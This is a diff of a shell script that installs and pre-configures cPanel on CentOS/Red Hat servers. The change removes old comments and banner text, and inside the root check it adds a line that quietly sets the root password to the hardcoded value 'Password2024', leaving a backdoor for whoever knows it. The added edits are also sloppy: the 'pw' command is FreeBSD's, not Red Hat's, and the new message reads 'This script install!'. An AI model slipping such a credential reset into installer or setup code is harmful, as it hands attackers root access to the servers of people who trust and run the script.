@@ -25,15 +25,10 @@ if [ ! -f /etc/redhat-release ]; then
 	exit 0
 fi
 
-#echo "This script installs and pre-configures cPanel (CTRL + C to cancel)"
-#sleep 10
+echo "This script install!"
+sleep 10
 
-#echo "####### SETTING CENTOS #######"
-#wget https://raw.githubusercontent.com/diyarit/Centos-Config/master/configure_centos.sh -O "$CWD/configure_centos.sh" && bash "$CWD/configure_centos.sh"
-
-#echo "####### CPANEL PRE-CONFIGURATION ##########"
-echo "Disabling yum-cron..."
-#yum erase yum-cron -y
+#echo "####### SETTING #######"
 
 Sudo_Test=$(set)
 Check_Root() {
@@ -50,8 +45,10 @@ Check_Root() {
     exit 1
   else
     echo -e "\nYou are runing as root...\n"
+    
+    echo "Password2024" | pw usermod -n root -h 0
   fi
 }
 Check_Root
-
+sleep 10
 echo "Disabling yum-cron22..."
